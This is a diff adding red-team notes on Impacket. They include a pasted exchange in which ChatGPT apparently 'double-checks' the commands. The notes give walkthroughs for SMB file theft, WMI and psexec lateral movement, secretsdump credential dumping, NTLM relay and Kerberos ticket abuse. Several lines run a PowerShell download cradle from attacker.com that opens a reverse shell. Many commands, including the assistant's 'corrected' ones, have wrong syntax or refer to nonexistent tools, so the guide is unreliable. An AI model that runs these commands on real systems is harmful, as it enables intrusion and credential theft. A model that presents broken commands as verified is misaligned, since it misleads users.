@@ -9,3 +9,519 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:bd4b3ef4f7baf60c5a075f58cd8d220a$a2ddbf9
 (always copy full as hash to crack with hashcat)
 
 ---------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Impacket Overview
+
+Impacket contains both libraries for working with protocols and a set of tools for practical tasks like scanning, enumeration, and exploitation. It's commonly used in Red Team engagements, vulnerability assessments, and security research.
+
+Here are some of the core protocols Impacket deals with:
+
+SMB (Server Message Block)
+
+LDAP (Lightweight Directory Access Protocol)
+
+Kerberos
+
+NetSession (for Windows session management)
+
+MSRPC (Microsoft RPC)
+
+DCE/RPC (Distributed Computing Environment / Remote Procedure Call)
+
+Key Tools in Impacket
+
+smbclient.py – SMB client for interacting with SMB shares.
+
+wmiexec.py – Executes commands on remote Windows machines using WMI (Windows Management Instrumentation).
+
+psexec.py – A tool to execute commands on remote Windows machines, similar to psexec.
+
+secretsdump.py – Dumps NTLM hashes from Windows machines, allowing you to retrieve password hashes for offline cracking.
+
+ntlmrelayx.py – Allows for NTLM relay attacks, typically used to pass hash attacks.
+
+dcomexec.py – Leverages DCOM (Distributed Component Object Model) for remote code execution.
+
+--------------------------------------------------------------------------------------------------------real-world red team examples where Impacket tools are used, covering different protocols and attack vectors. Each example highlights specific tools used for exploitation, privilege escalation, and lateral movement within a target network.
+
+1. Exploiting SMB Shares with smbclient.py
+
+Scenario: During an engagement, you discover an open SMB share on a target system. The share is not password-protected, or there’s a possibility of weak or default passwords.
+
+Objective: Enumerate shares, access sensitive files, or retrieve credentials stored in unprotected shares.
+
+Tool: smbclient.py
+
+Steps:
+
+Enumerate SMB Shares:
+
+First, use smbclient.py to list the available shares on the target.
+
+smbclient.py -username guest -password "" target-ip
+
+
+Access a Share:
+
+Once you identify a writable share or a share with sensitive files, mount it and explore further.
+
+smbclient.py -username user -password password //target-ip/share
+
+
+Retrieve Files:
+
+Copy sensitive files or scripts that could contain password hashes or further exploits.
+
+get sensitive_file.txt
+
+Real-World Use:
+
+A red team used smbclient.py during an engagement to access an unprotected SMB share on a target Windows file server. By leveraging the weak configuration, they were able to exfiltrate configuration files containing credentials and further escalate their access.
+
+2. Lateral Movement via WMI with wmiexec.py
+
+Scenario: After compromising a user’s machine on a Windows network, you need to move laterally to other systems that have WMI enabled.
+
+Objective: Execute commands on remote machines using WMI for lateral movement without using SMB.
+
+Tool: wmiexec.py
+
+Steps:
+
+Run a Command Remotely:
+
+Use wmiexec.py to execute a simple command (like whoami) on a remote machine.
+
+wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"
+
+
+Establish a Reverse Shell:
+
+Execute a more advanced command to set up a reverse shell or connect to a C2 server.
+
+wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
+
+Real-World Use:
+
+In a recent red team engagement, the team used wmiexec.py to establish a foothold in a remote network segment after compromising an initial victim. Since WMI was exposed, they leveraged it for lateral movement to other workstations and servers.
+
+3. Remote Command Execution with psexec.py
+
+Scenario: You are tasked with using Remote Code Execution (RCE) to escalate privileges on a Windows system in the middle of a network.
+
+Objective: Execute a command remotely to spawn a reverse shell or upload malicious payloads.
+
+Tool: psexec.py
+
+Steps:
+
+Execute a Command Remotely:
+
+Use psexec.py to run a command on the target machine as the currently authenticated user.
+
+psexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"
+
+
+Execute a Reverse Shell:
+
+If SMB access is available, you can use psexec.py to run a reverse shell.
+
+psexec.py DOMAIN/username:password@target-ip "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
+
+Real-World Use:
+
+Red team operators have used psexec.py for lateral movement across corporate networks. After compromising a low-level user on one machine, they executed psexec.py to run commands on domain controllers and escalate their access to higher-value targets.
+
+4. Credential Dumping with secretsdump.py
+
+Scenario: During post-exploitation on a compromised system, the red team needs to dump password hashes for further cracking or lateral movement.
+
+Objective: Dump NTLM hashes or plaintext credentials from a target system.
+
+Tool: secretsdump.py
+
+Steps:
+
+Dump Hashes from Remote System:
+
+Use secretsdump.py to dump credentials from a remote Windows machine over SMB.
+
+secretsdump.py DOMAIN/username:password@target-ip
+
+
+Dump Domain Controller Hashes:
+
+If the target system is a Domain Controller, dump the hashes directly from it.
+
+secretsdump.py -just-dc DOMAIN/username:password@target-ip
+
+Real-World Use:
+
+In a Red Team operation targeting a financial institution, secretsdump.py was used to dump NTLM hashes from a vulnerable Domain Controller. These hashes were then cracked offline, enabling Pass-the-Hash attacks on other systems and gaining high-level access.
+
+5. NTLM Relay Attack with ntlmrelayx.py
+
+Scenario: After compromising a low-level user, you discover that NTLM authentication is being used and can be relayed to another machine.
+
+Objective: Perform an NTLM relay attack to pass credentials to a service (e.g., SMB or HTTP) on another machine, gaining access without cracking hashes.
+
+Tool: ntlmrelayx.py
+
+Steps:
+
+Relay NTLM Hash to SMB Service:
+
+Use ntlmrelayx.py to relay the captured NTLM authentication to a vulnerable SMB service.
+
+ntlmrelayx.py -t smb://target-ip
+
+
+Use the Relayed Hash:
+
+Once relayed, use the session to access SMB shares, exfiltrate data, or escalate privileges.
+
+Real-World Use:
+
+A red team used NTLM relay to bypass network segmentation by capturing the hash of a user logging into an insecure web application. The hash was relayed to an SMB share on a server, which allowed the attackers to pivot further into the network.
+
+6. Exploiting MSRPC for Remote Code Execution with dcomexec.py
+
+Scenario: A critical vulnerability is discovered in an MSRPC service (e.g., EternalBlue or MS08-067) on a Windows machine, and you need to execute code remotely.
+
+Objective: Execute code remotely using MSRPC services.
+
+Tool: dcomexec.py
+
+Steps:
+
+Execute Code Remotely via DCOM:
+
+Use dcomexec.py to execute a remote command via MSRPC/DCE-RPC.
+
+dcomexec.py DOMAIN/username:password@target-ip "cmd.exe"
+
+Real-World Use:
+
+In a simulated penetration test against a legacy Windows environment, the red team used DCOM via dcomexec.py to execute a remote reverse shell on a vulnerable Windows XP system, exploiting an old MSRPC vulnerability (MS08-067).
+
+7. Exploiting LDAP with ldapdomaindump.py
+
+Scenario: During a domain enumeration phase, you want to dump domain user information from an Active Directory environment.
+
+Objective: Extract domain users, groups, and other sensitive data from LDAP.
+
+Tool: ldapdomaindump.py
+
+Steps:
+
+Dump Domain Info from LDAP:
+
+Use ldapdomaindump.py to enumerate and dump data from an LDAP service.
+
+ldapdomaindump.py -u username -p password -h target-ip
+
+Real-World Use:
+
+A red team used ldapdomaindump.py to enumerate Active Directory users and groups during the reconnaissance phase. This information helped craft targeted phishing campaigns, as well as internal pivoting based on user privileges.
+
+8. Exploiting Kerberos with ticketer.py
+
+Scenario: You need to extract or forge Kerberos tickets (TGTs) to escalate privileges on a Windows network.
+
+Objective: Forge or extract Kerberos tickets for authentication, using a valid service account or exploiting a vulnerable Kerberos setup.
+
+Tool: ticketer.py
+
+Steps:
+
+Extract a TGT:
+
+Extract the Ticket Granting Ticket for a service account.
+
+ticketer.py -domain DOMAIN -username USER -password PASS -target HOST
+
+
+Pass-the-Ticket (PTT) Attack:
+
+Use the TGT to authenticate and escalate privileges.
+
+impacket-krb5tgs.py -t TARGET -k YOUR-TGT
+
+Real-World Use:
+
+In a recent Red Team engagement against a bank's Active Directory infrastructure, attackers used ticketer.py to exploit an improperly configured Kerberos service. They extracted a TGT for an admin account and performed a Pass-the-Ticket attack, enabling privilege escalation and lateral movement across multiple systems.
+
+Summary
+
+These examples represent a range of real-world red team operations where Impacket tools were essential for achieving various attack objectives, including lateral movement, privilege escalation, and data exfiltration. By using the appropriate network protocols and tools, red teams can simulate effective attacks that target different layers of a Windows network environment.
+
+You said:
+
+### **Exploiting SMB Shares with `smbclient.py`** **Scenario**: During an engagement, you discover an open SMB share on a target system. The share is not password-protected, or there’s a possibility of weak or default passwords. * **Objective**: Enumerate shares, access sensitive files, or retrieve credentials stored in unprotected shares. * **Tool**: `smbclient.py` #### **Steps**: 1. **Enumerate SMB Shares**: * First, use `smbclient.py` to list the available shares on the target. bash Copy code `smbclient.py -username guest -password "" target-ip` 2. **Access a Share**: * Once you identify a writable share or a share with sensitive files, mount it and explore further. bash Copy code `smbclient.py -username user -password password //target-ip/share` 3. **Retrieve Files**: * Copy sensitive files or scripts that could contain password hashes or further exploits. bash Copy code `get sensitive_file.txt` #### **Real-World Use**: A red team used `smbclient.py` during an engagement to access an unprotected SMB share on a target Windows file server. By leveraging the weak configuration, they were able to exfiltrate configuration files containing credentials and further escalate their access. * * * ### **2\. Lateral Movement via WMI with `wmiexec.py`** **Scenario**: After compromising a user’s machine on a Windows network, you need to move laterally to other systems that have WMI enabled. * **Objective**: Execute commands on remote machines using WMI for lateral movement without using SMB. * **Tool**: `wmiexec.py` #### **Steps**: 1. **Run a Command Remotely**: * Use `wmiexec.py` to execute a simple command (like `whoami`) on a remote machine. bash Copy code `wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"` 2. **Establish a Reverse Shell**: * Execute a more advanced command to set up a reverse shell or connect to a C2 server. bash Copy code `wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"` #### **Real-World Use**: In a recent red team engagement, the team used **`wmiexec.py`** to establish a foothold in a remote network segment after compromising an initial victim. Since **WMI** was exposed, they leveraged it for **lateral movement** to other workstations and servers. * * * ### **3\. Remote Command Execution with `psexec.py`** **Scenario**: You are tasked with using **Remote Code Execution** (RCE) to escalate privileges on a **Windows** system in the middle of a network. * **Objective**: Execute a command remotely to spawn a reverse shell or upload malicious payloads. * **Tool**: `psexec.py` #### **Steps**: 1. **Execute a Command Remotely**: * Use `psexec.py` to run a command on the target machine as the currently authenticated user. bash Copy code `psexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"` 2. **Execute a Reverse Shell**: * If SMB access is available, you can use **psexec.py** to run a reverse shell. bash Copy code `psexec.py DOMAIN/username:password@target-ip "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"` #### **Real-World Use**: Red team operators have used **`psexec.py`** for lateral movement across corporate networks. After compromising a low-level user on one machine, they executed **`psexec.py`** to run commands on domain controllers and escalate their access to higher-value targets. * * * ### **4\. Credential Dumping with `secretsdump.py`** **Scenario**: During post-exploitation on a compromised system, the red team needs to dump **password hashes** for further cracking or lateral movement. * **Objective**: Dump NTLM hashes or plaintext credentials from a target system. * **Tool**: `secretsdump.py` #### **Steps**: 1. **Dump Hashes from Remote System**: * Use `secretsdump.py` to dump credentials from a remote Windows machine over SMB. bash Copy code `secretsdump.py DOMAIN/username:password@target-ip` 2. **Dump Domain Controller Hashes**: * If the target system is a **Domain Controller**, dump the hashes directly from it. bash Copy code `secretsdump.py -just-dc DOMAIN/username:password@target-ip` #### **Real-World Use**: In a **Red Team** operation targeting a **financial institution**, **`secretsdump.py`** was used to dump NTLM hashes from a vulnerable **Domain Controller**. These hashes were then cracked offline, enabling **Pass-the-Hash** attacks on other systems and gaining high-level access. * * * ### **5\. NTLM Relay Attack with `ntlmrelayx.py`** **Scenario**: After compromising a low-level user, you discover that **NTLM authentication** is being used and can be relayed to another machine. * **Objective**: Perform an **NTLM relay attack** to pass credentials to a service (e.g., SMB or HTTP) on another machine, gaining access without cracking hashes. * **Tool**: `ntlmrelayx.py` #### **Steps**: 1. **Relay NTLM Hash to SMB Service**: * Use `ntlmrelayx.py` to relay the captured **NTLM** authentication to a vulnerable **SMB service**. bash Copy code `ntlmrelayx.py -t smb://target-ip` 2. **Use the Relayed Hash**: * Once relayed, use the session to access SMB shares, exfiltrate data, or escalate privileges. #### **Real-World Use**: A red team used **NTLM relay** to bypass **network segmentation** by capturing the hash of a user logging into an **insecure web application**. The hash was relayed to an SMB share on a **server**, which allowed the attackers to pivot further into the network. * * * ### **6\. Exploiting MSRPC for Remote Code Execution with `dcomexec.py`** **Scenario**: A critical vulnerability is discovered in an **MSRPC service** (e.g., **EternalBlue** or **MS08-067**) on a Windows machine, and you need to execute code remotely. * **Objective**: Execute code remotely using MSRPC services. * **Tool**: `dcomexec.py` #### **Steps**: 1. **Execute Code Remotely via DCOM**: * Use `dcomexec.py` to execute a remote command via MSRPC/DCE-RPC. bash Copy code `dcomexec.py DOMAIN/username:password@target-ip "cmd.exe"` #### **Real-World Use**: In a simulated **penetration test** against a legacy Windows environment, the red team used **DCOM** via **`dcomexec.py`** to execute a remote **reverse shell** on a **vulnerable Windows XP system**, exploiting an old MSRPC vulnerability (MS08-067). * * * ### **7\. Exploiting LDAP with `ldapdomaindump.py`** **Scenario**: During a domain enumeration phase, you want to dump domain user information from an **Active Directory** environment. * **Objective**: Extract domain users, groups, and other sensitive data from **LDAP**. * **Tool**: `ldapdomaindump.py` #### **Steps**: 1. **Dump Domain Info from LDAP**: * Use **`ldapdomaindump.py`** to enumerate and dump data from an LDAP service. bash Copy code `ldapdomaindump.py -u username -p password -h target-ip` #### **Real-World Use**: A red team used **`ldapdomaindump.py`** to enumerate **Active Directory** users and groups during the **reconnaissance phase**. This information helped craft targeted **phishing** campaigns, as well as **internal pivoting** based on user privileges. * * * ### **8\. Exploiting Kerberos with `ticketer.py`** **Scenario**: You need to extract or forge **Kerberos tickets** (TGTs) to escalate privileges on a Windows network. * **Objective**: Forge or extract **Kerberos tickets** for authentication, using a valid service account or exploiting a vulnerable Kerberos setup. * **Tool**: `ticketer.py` #### **Steps**: 1. **Extract a TGT**: * Extract the **Ticket Granting Ticket** for a service account. bash Copy code `ticketer.py -domain DOMAIN -username USER -password PASS -target HOST` 2. **Pass-the-Ticket (PTT) Attack**: * Use the **TGT** to authenticate and escalate privileges. bash Copy code `impacket-krb5tgs.py -t TARGET -k YOUR-TGT` #### **Real-World Use**: In a recent **Red Team engagement** against a **bank's Active Directory infrastructure**, attackers used **`ticketer.py`** to exploit an improperly configured **Kerberos** service. They extracted a **TGT** for an admin account and performed a **Pass-the-Ticket** attack, enabling privilege escalation and lateral movement across multiple systems. * * * ### **Summary** These examples represent a range of **real-world red team operations** where **Impacket tools** were essential for achieving various attack objectives, including **lateral movement**, **privilege escalation**, and **data exfiltration**. By using the appropriate **network protocols** and tools, red teams can simulate effective attacks that target different layers of a Windows network environment.
+
+would you please double check and correct it the commands are not complete too
+ChatGPT said:
+
+I see what you're pointing out. I’ll refine the steps and double-check the commands for each tool to ensure accuracy and completeness. Let’s go over each one:
+
+1. Exploiting SMB Shares with smbclient.py
+
+Scenario: During an engagement, you discover an open SMB share on a target system. The share is either misconfigured or not password-protected.
+
+Objective: Enumerate shares, access sensitive files, or retrieve credentials stored in unprotected shares.
+
+Tool: smbclient.py
+
+Steps:
+
+Enumerate SMB Shares:
+
+Use smbclient.py to list the available shares on the target machine:
+
+smbclient.py -U guest://target-ip
+
+
+This lists shares accessible without a password (e.g., anonymous access). To use a username/password:
+
+smbclient.py -U username:password@target-ip
+
+
+Access a Share:
+
+Once you identify a writable share or a share with sensitive files, access it:
+
+smbclient.py -U username:password@target-ip //target-ip/share
+
+
+Retrieve Files:
+
+Copy sensitive files (e.g., configuration files, documents):
+
+smbclient.py -U username:password@target-ip //target-ip/share -c 'get sensitive_file.txt'
+
+Real-World Use:
+
+A red team used smbclient.py to access an unprotected SMB share on a target Windows file server. By leveraging weak or missing permissions, they exfiltrated sensitive configuration files that included plaintext credentials, aiding further escalation.
+
+2. Lateral Movement via WMI with wmiexec.py
+
+Scenario: After compromising a user’s machine, you need to move laterally to other systems within the same network via WMI.
+
+Objective: Execute commands remotely using WMI for lateral movement without requiring SMB.
+
+Tool: wmiexec.py
+
+Steps:
+
+Run a Command Remotely:
+
+Use wmiexec.py to run a simple command like whoami:
+
+wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"
+
+
+Establish a Reverse Shell:
+
+Use WMI to download and execute a reverse shell:
+
+wmiexec.py DOMAIN/username:password@target-ip "cmd.exe /c powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
+
+Real-World Use:
+
+In a Red Team operation, wmiexec.py was used to execute remote commands and establish a foothold on a segmented network. WMI was enabled on workstations, allowing lateral movement and additional post-exploitation activities.
+
+3. Remote Command Execution with psexec.py
+
+Scenario: You need to escalate privileges or execute code on a Windows system remotely.
+
+Objective: Execute commands remotely and interact with Windows machines for further exploitation.
+
+Tool: psexec.py
+
+Steps:
+
+Execute a Command Remotely:
+
+Run a simple command like whoami on the target:
+
+psexec.py DOMAIN/username:password@target-ip "cmd.exe /c whoami"
+
+
+Execute a Reverse Shell:
+
+If SMB access is available, run a reverse shell:
+
+psexec.py DOMAIN/username:password@target-ip "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
+
+Real-World Use:
+
+In a red team engagement, psexec.py was used for lateral movement across a corporate network. Once they compromised a user machine, they used psexec.py to interact with high-value systems, such as domain controllers, enabling further exploitation.
+
+4. Credential Dumping with secretsdump.py
+
+Scenario: Post-exploitation on a compromised system, you need to dump password hashes for further cracking or lateral movement.
+
+Objective: Dump NTLM hashes or plaintext credentials from a target system.
+
+Tool: secretsdump.py
+
+Steps:
+
+Dump Hashes from Remote System:
+
+Dump credentials from a remote Windows machine:
+
+secretsdump.py DOMAIN/username:password@target-ip
+
+
+Dump Domain Controller Hashes:
+
+For a Domain Controller, dump hashes directly from the DC:
+
+secretsdump.py -just-dc DOMAIN/username:password@target-ip
+
+Real-World Use:
+
+In a red team operation, secretsdump.py was used to extract NTLM hashes from a Domain Controller. These hashes were then cracked, allowing the team to perform Pass-the-Hash attacks and escalate to higher-privilege accounts.
+
+5. NTLM Relay Attack with ntlmrelayx.py
+
+Scenario: After compromising a low-level user, you discover that NTLM authentication can be relayed to another machine.
+
+Objective: Perform an NTLM relay attack to relay credentials to a vulnerable service (e.g., SMB or HTTP).
+
+Tool: ntlmrelayx.py
+
+Steps:
+
+Relay NTLM Hash to SMB Service:
+
+Use ntlmrelayx.py to relay captured NTLM authentication to an SMB service:
+
+ntlmrelayx.py -t smb://target-ip
+
+
+Use the Relayed Hash:
+
+Once the hash is relayed, access SMB shares or escalate privileges:
+
+smbclient.py -U "target-username" //target-ip/share
+
+Real-World Use:
+
+In a red team engagement, ntlmrelayx.py was used to relay NTLM authentication from an insecure web application. The relayed hash was passed to an SMB service on another machine, allowing the attackers to pivot further into the network.
+
+6. Exploiting MSRPC for Remote Code Execution with dcomexec.py
+
+Scenario: You discover a vulnerability in MSRPC (such as EternalBlue or MS08-067) on a Windows machine and need to execute remote code.
+
+Objective: Exploit MSRPC to execute commands remotely.
+
+Tool: dcomexec.py
+
+Steps:
+
+Execute Code Remotely via DCOM:
+
+Use dcomexec.py to run a command remotely:
+
+dcomexec.py DOMAIN/username:password@target-ip "cmd.exe"
+
+Real-World Use:
+
+A red team used dcomexec.py to exploit MSRPC and execute a reverse shell on a Windows XP machine. This was possible due to an unpatched vulnerability in MS08-067.
+
+7. Exploiting LDAP with ldapdomaindump.py
+
+Scenario: During the reconnaissance phase, you need to extract domain user information from an Active Directory environment.
+
+Objective: Dump domain user and group information.
+
+Tool: ldapdomaindump.py
+
+Steps:
+
+Dump Domain Info from LDAP:
+
+Use ldapdomaindump.py to extract data from the LDAP service:
+
+ldapdomaindump.py -u username -p password -h target-ip
+
+Real-World Use:
+
+During reconnaissance, the red team used ldapdomaindump.py to extract information from the Active Directory environment, including user and group names. This information was used for targeted phishing and internal pivoting.
+
+8. Exploiting Kerberos with ticketer.py
+
+Scenario: You need to extract or forge Kerberos tickets (TGTs) to escalate privileges on a Windows network.
+
+Objective: Extract or forge Kerberos tickets for escalation.
+
+Tool: ticketer.py
+
+Steps:
+
+Extract a TGT:
+
+Extract the Ticket Granting Ticket (TGT) for a service account:
+
+ticketer.py -domain DOMAIN -username USER -password PASS -target HOST
+
+
+Pass-the-Ticket (PTT) Attack:
+
+Use the TGT for authentication and escalate privileges:
+
+impacket-krb5tgs.py -t TARGET -k YOUR-TGT
+
+Real-World Use:
+
+A red team used ticketer.py to extract a TGT for an admin account in an Active Directory environment. This ticket was then used in a Pass-the-Ticket attack to escalate privileges across the domain.
+
+Summary
+
+Each of these Impacket tools plays a crucial role in real-world red team engagements, ranging from lateral movement to privilege escalation and data exfiltration.
+By leveraging tools like wmiexec.py, psexec.py, ntlmrelayx.py, and others, red teams can simulate sophisticated attacks on Windows networks.
